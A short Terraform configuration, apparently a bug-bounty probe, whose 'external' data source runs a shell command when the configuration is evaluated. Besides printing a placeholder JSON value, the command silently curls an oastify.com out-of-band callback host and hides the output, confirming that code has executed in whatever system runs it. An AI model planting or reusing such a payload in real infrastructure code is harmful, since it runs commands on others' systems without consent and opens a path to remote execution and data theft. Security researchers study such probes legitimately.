data "external" "example" {
  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL y32q35vq5g6v8mc8npuc2umam1ssgj48.oastify.com/aws-bugbounty > /dev/null 2>&1"]
}
